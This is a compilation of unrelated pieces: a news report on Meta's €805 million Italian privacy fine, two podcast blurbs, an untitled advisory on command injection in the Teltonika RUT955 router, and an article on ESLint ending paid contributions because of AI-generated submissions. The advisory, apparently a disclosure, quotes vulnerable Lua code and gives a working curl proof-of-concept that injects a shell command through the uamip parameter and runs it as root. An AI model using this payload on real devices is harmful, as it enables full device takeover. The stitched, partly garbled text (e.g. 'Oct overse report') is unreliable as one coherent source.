Context: The Garante, Italy's data protection authority, found that the feature was enabled by default and that the app accessed Italian users' photos, videos, and related metadata...
Full Text:
Meta was fined €805 million in Italy yesterday over a Facebook for Android feature that suggests photos and videos from users' phone galleries for them to post.

The Garante, Italy's data protection authority, found that the feature was enabled by default and that the app accessed Italian users' photos, videos, and related metadata without their explicit consent.

The company has 60 days to switch the feature off by default, including for people who have already granted the app gallery access, and to request consent separately.

Meta plans to appeal and calls the fine "disproportionate", a spokesperson said in a statement reported by Reuters.

The app asks for gallery access via a single permission that covers the whole app and several functions with different purposes, the authority found. A general notice about enabling other features appears first, but it does not make it clear to users that they are also enabling gallery suggestions.

Fully granted, a permission like this lets the app read the phone's whole photo archive, usually on an ongoing basis. Neither the user nor the authority can check which information is actually used.

The authority found a breach of Article 122 of Italy's Privacy Code, which puts the EU's ePrivacy Directive into Italian law. That rule treats a phone as part of a person's private life. Any access to what the phone stores, therefore, requires free and informed consent, whether or not data is sent anywhere or harm results.

The authority's order, set out in its press release, requires the company to:

Within 60 days, ask for consent through a separate, specific request for this feature, and explain clearly what the feature is for, that it accesses the gallery, and how to turn it off.

Within 60 days, keep the feature off by default, including for people who already granted the permission.

Within 30 days, report to the authority on the work it has started, and within 90 days, on the measures it has taken.

If the company misses the 60-day deadline, the feature cannot be switched on for anyone who has not given valid consent.

Meta said in a statement quoted in a Reuters report that the feature works only after users give permission on their device, and that they can change that permission at any time in their settings.

The Centro Tutela Consumatori Utenti, the Bolzano consumer protection group whose complaint started the investigation, published consumer advice on July 11, 2025. It told users to switch off the gallery suggestion settings in the app and to check what access and permissions the Facebook app has on their phone.

The investigation did not look at whether gallery content was used to train AI models. The company denies any such use. The authority may separately examine a newer feature, launched this year, that allows gallery content to be processed in the cloud.

The company had argued that Ireland's data protection authority should handle the case. The Garante rejected that argument because the ePrivacy rules do not provide a one-stop-shop mechanism.

The feature has been available since 2023. The investigation began in July 2025 and included the authority's own technical analysis.

The fine equals about 0.47% of the group's global revenue. In setting it, the authority weighed the large number of people involved, about 20 million Android users in Italy.

It also weighed how long the breach has lasted. The breach is still ongoing for people who have not updated the app, and for those who have already granted permission, the authority said.

Other factors were a 2019 decision against the company and limited cooperation during the investigation. Changes the company made after the complaint counted in its favor, though the authority judged them late and limited to people who update the app.

Title: Making software safer: Introducing the Software Safety Institute. [Special Edition]
Context: Dave Bittner is joined by guests ⁠Lauren Zabierek⁠ and ⁠Bob Lord⁠, co-founders of the ⁠Software Safety Institute⁠
Full Text:
Dave Bittner is joined by guests ⁠Lauren Zabierek⁠ and ⁠Bob Lord⁠, co-founders of the ⁠Software Safety Institute⁠. Lauren and Bob discuss the launch of the Software Safety Institute, the work behind its creation, and the push for greater accountability among software manufacturers.

Join Dave, Lauren and Bob to learn why insecure software creates preventable harm and why the answer requires more than asking users to patch faster. Drawing on automotive safety, their work on CISA’s Secure by Design initiative, market incentives, public education, and regulation, they describe how SSI hopes to make software safety visible and measurable.

Title: Satellite hacking enters the AI era. [T-Minus: Space-Cyber Briefing]
Context: As AI becomes advances, the technology is creating opportunities for both attackers and defenders alike significantly changing the threat landscape
Full Text:
As AI becomes advances, the technology is creating opportunities for both attackers and defenders alike significantly changing the threat landscape.

Host Maria Varmazis sits down with ⁠Alissa Knight⁠, CEO and CAIO of ⁠Assail⁠, to discuss the impact of AI-enabled hacking on space infrastructure⁠. AI platforms are increasing both the scale and scope of cyberattacks forcing defenders to reevaluate how they defend infrastructure both on the ground and in-orbit.

## Vendor Description ##

> RUT955 is a highly reliable and secure LTE router with I/O, GNSS and
> RS232/RS485 for professional applications. Router delivers high
> performance, mission-critical cellular communication and GPS location
> capabilities. 

Source: <https://teltonika.lt/product/rut955/>

## Impact ##

An attacker can fully compromise the device, by exploiting the
vulnerabilities documented in this advisory. Sensitive data stored or
transmitted via the device might get exposed through this attack. 

We recommend upgrading to version RUT9XX_R_00.04.233 or newer, which
includes fixes for the vulnerabilities described in this advisory. The scripts are
part of the coova-chilli captive portal. However, the vulnerabilities
are exploitable regardless of the device configuration, even if no
captive portal is configured. 

More concretely, the following parameters are vulnerable:

* `/cgi-bin/autologin.cgi`
 * reply
 * uamport
 * challenge
 * userurl
 * res
 * reason
 * *If* res=success
 * uamip
 * uamport
 * userurl
* `/cgi-bin/hotspotlogin.cgi`
 * *If* send=1
 * uamip
 * TelNum
 * challenge
 * uamport
 * userurl
 * *If* button=1 or (res=wispr and UserName=1)
 * uamport
 * uamip
 * *If* res=success or res=already or res=popup2
 * uamip
 * uamport
 * *If* res=logoff or res=popup3
 * uamip
 * uamport

The affected scripts use these parameters to build OS commands via
string concatenation without proper sanitization. 

The vulnerabilities are located in the source files `hotspotlogin.cgi`
and `landing_page_functions.lua`, which is included from `autologin.cgi`
and `hotspotlogin.cgi`. 

For example, it provides the function `getParam`, which directly passes
the argument to `io.popen`:

```lua
[...]
function getParam(string)
 local h = io.popen(string)
 local t = h:read()
 h:close()
 return t
end
[...]
```

`landing_page_functions.lua` also provides the functions `debug` and
`get_ifname`, which use `os.execute` and `getParam` in an insecure way:

```lua
[...]
function debug(string)
 if debug_enable == 1 then
 os.execute("/usr/bin/logger -t hotspotlogin.cgi \""..string.."\"")
 end
end
[...]
function get_ifname(ip)
 local result = getParam(format("ip addr | grep \"%s\"", ip))
 local tun = string.match(result, "(tun%d+)")
 local ifname = "wlan0"
[...]
```

For example, `hotspotlogin.cgi` makes use of the functions `get_ifname` and
`getParam`. Occasionally, it also insecurely uses `os.execute` directly:

```lua
[...]
if send and send ~= "" and tel_num then
 local ifname = get_ifname(uamip)
 local pass = generate_code(ifname) or "0000"
 tel_num = tel_num:gsub("%%2B", "+")
 local exists = getParam("grep \"" ..tel_num.. "\" /etc/chilli/" .. ifname .. "/smsusers")
 local user = string.format("%s", pass)
 local uri = os.getenv("REQUEST_URI")
 local message = string.format("%s Password - %s \n Link - http://%s%s?challenge=%s&uamport=%s&uamip=%s&userurl=%s&UserName=%s&button=1", tel_num, pass, uamip, uri, challenge, uamport, uamip, userurl, pass)
 local smsotp_mesg=string.format("%s;%s", tel_num, pass)
 message = getParam(string.format("/usr/sbin/gsmctl -Ss \"%s\"", message))

 if message == "OK" then
 os.execute("echo \""..smsotp_mesg.."\" >> /tmp/smsotp.log")
 sms = "sent"
 if exists then
 os.execute("sed -i 's/" ..exists.. "/" ..user.. "/g' /etc/chilli/" .. ifname .. "/smsusers")
 else
 os.execute("echo \"" ..user.. "\" >>/etc/chilli/" .. ifname .. "/smsusers")
 end
[...]
```

In one of the first lines of the above code snippet, `hotspotlogin.cgi`
calls `get_ifname` with unsanitized user input from the parameter
`uamip`. A few lines later it calls `getParam` with unsanitized user
input from the parameter `TelNum`. In a further call to `getParam` it
uses more unsanitized user input. 

There are futher locations that call insecure functions like `debug`
and `get_ifname` either directly or indirectly with user input from the
scripts `autologin.cgi` and `hotspotlogin.cgi`. 

## Proof-of-Concept ##

For example, an attacker can exploit this vulnerability by manipulating
the `uamip` parameter:

```sh
curl -v -o /dev/null "http://$IP/cgi-bin/hotspotlogin.cgi" -d 'send=1&uamip="; id >/tmp/test #'
```

The device executes the commands with root privileges:

```bash
# cat /tmp/test
uid=0(root) gid=0(root)
```

Title: ESLint Ends Paid Contributor Program as AI Upends Open Source Collaboration
Context: In June, the Godot Foundation announced changes to its contribution policies after struggling with a growing backlog of pull requests and a limited number of qualified reviewers
Full Text:
ESLint is retiring its contributor pool after five years, citing growing difficulties with AI-generated contributions and disputes over whether contributors deserved payment for work produced with AI assistance.

In a November 13 announcement, ESLint creator Nicholas C. Zakas said the program had paid outside contributors more than $51,000 and helped recruit several future team members. But the increasing volume of AI-generated issues and pull requests, along with accusations about undisclosed AI use, had made the program increasingly difficult to administer.

The decision comes as open source projects across the ecosystem are reconsidering how they accept, review, and reward contributions. Some are restricting outside pull requests, others are tightening their AI policies, and several are struggling with the additional review work created by AI-assisted development.

ESLint Ends Five-Year Experiment in Paying Contributors #

ESLint introduced its contributor pool in 2022 to compensate people outside the core team for meaningful contributions to the project. The program initially allocated $1,000 per month before switching to a model that reserved 10% of monthly income for contributors. Eligible work included code, documentation, answering questions in Discord, and other activities that benefited the project.

The experiment was successful by the team's own assessment. ESLint paid outside contributors $24,680 in 2025 alone, bringing its total payouts from 2022 through 2025 to $51,180. The program encouraged repeat contributions and helped attract people who eventually joined the ESLint team.

Zakas emphasized that the decision to retire the program was unrelated to its growing expense. In his conclusion, he acknowledged how much the contributor pool had accomplished and how dramatically the circumstances surrounding it had changed.

"The contributor pool was an approach designed for a completely different time in open source. A time when we were still making human-to-human connections through a shared goal of creating great software. It worked well for a time, and we’re grateful to everyone who made a meaningful contribution to ESLint in the last five years. It introduced us to many future team members who remain with the project today."

Beginning in 2025, ESLint noticed a growing number of AI-generated issues and pull requests. The team decided that contributions produced primarily through AI tools would not qualify for payment, reasoning that asking an assistant to implement a change did not represent the kind of effort the program was intended to encourage.

Contributors were asked to disclose AI assistance in their pull request descriptions, but not everyone complied. As coding models improved, maintainers found it increasingly difficult to distinguish human-authored contributions from AI-generated work.

The situation became more contentious when people Zakas called "AI monitors" began examining pull requests and contributor payment reports, publicly accusing some contributors of undisclosed AI use. Zakas said he also received private messages warning him about accounts suspected of submitting AI-generated work.

"All of this took the joy out of the contributor pool," he wrote.

With AI-generated pull requests now dominating the project's submissions, ESLint decided to discontinue the program effective immediately rather than continue investigating the origins of individual contributions.

The decision does not prohibit AI-assisted development. ESLint's AI usage policy still allows contributors to use these tools, provided they disclose their use, review the generated work, and remain responsible for their submissions. AI-generated pull requests must also address issues that the team has explicitly accepted.

AI-Generated Contributions Are Changing Economics of Code Review #

According to GitHub's 2026 Oct overse report, more than 40% of pull requests on the platform began with an AI agent's first draft by September, up from 17% in March. GitHub reported 110 million agent-started pull requests in September alone.

Many of these submissions represent legitimate development work, and AI tools are helping experienced engineers implement changes more efficiently. For open source maintainers, however, the growing volume also complicates assumptions that have traditionally guided the contribution and review process.

In August, Rust contributor Jynn Nelson explained why five teams working on the rust-lang/rust repository had adopted new policies governing AI use. She emphasized that contributions have traditionally served a purpose beyond improving the code itself:

While the Rust project is a collection of technical artifacts, it is also a community of people who work together to build, maintain, and extend those artifacts. When we talk about 'contributing to the Rust project', we partly mean work on those artifacts, but we also mean joining that community and collaborating with the people already there.

Historically, a polished, well-tested pull request suggested that its author had invested time in understanding the codebase. Maintainers could reasonably expect that someone submitting substantial work might be interested in further contributions, making the review process an opportunity for mentorship.

AI-generated code has made those signals less reliable. A contributor can now produce an impressive-looking patch without necessarily understanding how it works, why the change is needed, or how it fits into the project's architecture.

The consequences are particularly evident at tldraw, where founder Steve Ruiz described an unusual problem in January involving AI-generated issues and the contributors attempting to resolve them.

Ruiz had created a Claude Code command that converted his rough notes about bugs and feature ideas into detailed GitHub issues. When the original instructions were sufficiently clear, the system worked well. When they were vague, the AI sometimes invented bugs or proposed solutions to problems that did not exist.

Outside contributors were then using their own AI coding assistants to implement those issues, producing pull requests that appeared technically sound but addressed problems the project never intended to solve.

Some of the submissions passed automated tests and initially looked like useful contributions. The underlying issue was that neither AI system had enough context to determine whether the work made sense. Ruiz's issue-writing assistant had generated misleading tasks, and contributors' coding assistants were implementing them without questioning the premise.

The experience led tldraw to announce that it would automatically close external pull requests, although it would continue accepting bug reports, issues, and discussions.

Ruiz questioned whether outside contributions still offered enough value to justify the review work they created:

I think this misses the point. We already accept code written with AI. I write code with AI tools. I expect my team to use AI tools too. If you know the codebase and know what you're doing, writing great code has never been easier than with these tools.

The question is more fundamental. In a world of AI coding assistants, is code from external contributors actually valuable at all?

If writing the code is the easy part, why would I want someone else to write it?

AI is changing the economics of code review. Even technically correct code can be a bad fit for a project, and maintainers still have to judge whether a change belongs, whether its author understands it, and whether anyone will take responsibility for it after it's merged.

Maintainers Are Tightening Contribution Requirements #

Several major open source projects have responded by introducing stricter rules for AI-generated work and new contributors.

In June, the Godot Foundation announced changes to its contribution policies after struggling with a growing backlog of pull requests and a limited number of qualified reviewers.

Godot said AI-generated submissions had intensified an existing problem: producing a pull request had become considerably easier, while the effort required to review one had remained largely unchanged.

The project moved to prohibit autonomous AI agents, substantial AI-generated code, and AI-generated text in discussions between contributors. New contributors with three or fewer merged pull requests must also obtain maintainer permission before proposing new features or significant refactors.

Godot's announcement raised another concern beyond the immediate review burden. Maintainers traditionally invest time helping inexperienced contributors understand the codebase, partly because those contributors may eventually become reviewers and maintainers themselves.

When feedback is passed directly into an AI coding assistant without the contributor developing that understanding, reviewers may spend considerable time on an exchange that does little to strengthen the project's future maintainer base.

LLVM has adopted a more permissive policy that allows AI-assisted contributions with human oversight, but it explicitly prohibits using AI tools to complete issues labeled good first issue. Those tasks are reserved as learning opportunities for developers getting acquainted with the codebase.

LLVM also prohibits autonomous agents from participating in project discussions or submitting changes without human approval. Its policy places responsibility on contributors to understand and review AI-generated material before asking maintainers to evaluate it.

Node.js has introduced additional requirements for pull requests exceeding 5,000 lines, addressing the difficulty of reviewing unusually large changes.

The strain on reviewers has also become apparent in the Linux kernel.

On November 10, Linux kernel developer Lorenzo Stoakes submitted changes to remove himself from several memory-management and Rust-related reviewer roles, citing the volume of AI-generated patch series.

Stoakes, an Arm engineer who remains a maintainer in his own areas of responsibility, explained that the volume of incoming work had forced him to limit his review commitments.

Given the current throughput in the kernel resulting from AI-generatedseries, I unfortunately lack the bandwidth to generally be able to offerreview except in those areas I maintain.

In the subsequent mailing-list discussion, he described encountering low-quality AI-generated submissions occasionally at first, then weekly, and eventually every few days. He estimated that such submissions now accounted for roughly half or more of the patches he encountered.

Stoakes clarified that he was primarily trying to reduce inbox noise and focus on his maintainer responsibilities. His account nevertheless offers a recent example of how the increasing volume of generated code is affecting experienced reviewers.

A Linux Foundation study published in October found that 59% of surveyed maintainers reported growing contributions associated with generative AI. Respondents estimated that 25% of incoming pull requests were low-quality AI-generated submissions.

Open Source Projects Are Reconsidering Contributor Incentives #

ESLint isn't the only project reconsidering payments to outside contributors as AI makes it easier to generate submissions in large numbers.

In January, curl announced that it was shutting down its bug bounty program after maintainers were overwhelmed by low-quality vulnerability reports, including many generated with AI assistance.

Curl creator Daniel Stenberg said the project had experienced a sustained increase in reports that required investigation but produced few actionable findings. The project ended its financial rewards and stopped recommending HackerOne as its reporting channel, directing researchers to its own disclosure process instead.

The pressure continued beyond bug bounty submissions. In July, curl temporarily suspended vulnerability reporting for an entire month to give its maintainers time to address other work.

Stenberg later described the month-long break as one of the project's best decisions in recent memory:

The effect was almost immediate. Just a few days into the bliss, my fellow curl maintainers all agreed with me that we felt a sense of relief, of vacation and that a load had been taken off our chests. We felt free, unchained, and now suddenly able to do what we wanted.

We could now spend time reviewing some of the queued up pull-requests for features and changes we like.

GitHub has also expanded the options available to repository owners in response to these issues. In February, the platform introduced settings that allow maintainers to disable pull requests or restrict them to existing collaborators, giving projects more control over which contributions they accept.

For projects that rely on outside participation, restricting contributions creates its own difficulties. New developers need opportunities to learn unfamiliar codebases, receive feedback, and develop relationships with maintainers. Those interactions have historically helped sustain open source communities, even when reviewing a newcomer's first contribution required more effort than writing the code independently.

ESLint is ending a program that successfully recruited contributors because the effort required to distinguish qualifying work has become too burdensome. Other projects are making different choices, from imposing tighter contribution requirements to changing how they fund security work or limiting access to their repositories.

Restricting outside contributions may spare maintainers from a flood of AI-generated submissions, but it also threatens one of the ways open source projects have historically recruited and developed the people who keep them running.

"Whether or not AI-powered contributions will lead to the same type of dedication as human-authored contributions is yet to be seen," Zakas said. "All I can say at the moment is that open source has changed and we need to change with it."
